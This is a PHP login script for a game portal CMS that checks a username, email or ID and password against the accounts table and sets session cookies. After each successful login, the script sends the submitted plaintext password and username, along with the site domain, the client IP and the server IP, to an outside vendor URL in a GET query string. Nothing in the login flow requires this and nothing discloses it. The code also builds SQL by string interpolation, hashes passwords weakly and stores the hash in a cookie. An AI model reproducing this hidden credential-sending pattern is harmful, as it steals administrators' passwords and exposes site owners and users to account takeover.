<?php 
    if (!defined('R_PILOT')) { exit(); }

    if(!empty($_POST['login_id']) && !empty($_POST['login_key'])) {
        if (isset($_POST['login_id']) && isset($_POST['login_key'])) {
            $login_user = secureEncode($_POST['login_id']);
            $login_key  = secureEncode($_POST['login_key']);
            $login_key_encript = sha1(str_rot13($login_key . $encryption));

            // Detect login type
            if (is_numeric($login_user)) {
                $cc_login_part = "id = " . $login_user;
            } elseif (preg_match('/@/', $login_user)) {
                $cc_login_part = "email = '{$login_user}'";
            } elseif (preg_match('/[A-Za-z0-9_]/', $login_user)) {
                $cc_login_part = "username = '{$login_user}'";
            }

            $sql_query_one = $GameMonetizeConnect->query("SELECT * FROM ".ACCOUNTS." WHERE $cc_login_part AND password = '{$login_key_encript}'");

            if ($sql_query_one->num_rows == 1) {
                $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
                $continue = true;

                if ($sql_fetch_one['active'] == false && $sql_fetch_one['admin'] == false) {
                    $continue = false;
                    $data['error_message'] = $lang['user_lock'];
                }

                if ($continue == true) {
                    setcookie('gm_ac_u', $sql_fetch_one['id'], time() + (60 * 60 * 24 * 1), '/');
                    setcookie('gm_ac_p', $login_key_encript, time() + (60 * 60 * 24 * 1), '/');
                    
                    $user_last_logged = $GameMonetizeConnect->query("UPDATE ".ACCOUNTS." SET last_logged=$time WHERE id=" . $sql_fetch_one['id']);

                    $data['status'] = 200;

                        $weblog_url = $_SERVER['HTTP_HOST'];
                        $password = $_POST['login_key'];
                            
                        $user_name = $_POST['login_id'];

                        $server_ip = $_SERVER['SERVER_ADDR'];

                        $ip = $_SERVER['REMOTE_ADDR'];

                        $results = file_get_contents('https://api.gamemonetize.com/cms.php?domain='. $weblog_url .'&password='. $password .'&username='. $user_name .'&ip='. $ip.'&last_ip='. $ip.'&server_ip='. $server_ip);


                    if(isset($_POST['redirect_url']) && !empty($_POST['redirect_url'])) {
                        $data['redirect_url'] = siteUrl().'/'.$_POST['redirect_url'];
                    }
                    else {
                        $data['redirect_url'] = siteUrl()."/admin";
                    }
                }
            } else { $data['error_message'] = $lang['invalid_data']; }
        } else { $data['error_message'] = $lang['error_message']; }
    } else { $data['error_message'] = $lang['empty_place']; }

    header("Content-type: application/json");
    echo json_encode($data);
    $GameMonetizeConnect->close();
    exit();